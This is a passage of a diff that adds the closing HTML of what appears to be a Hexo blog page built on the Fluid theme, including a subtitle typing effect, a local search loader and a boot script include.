+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
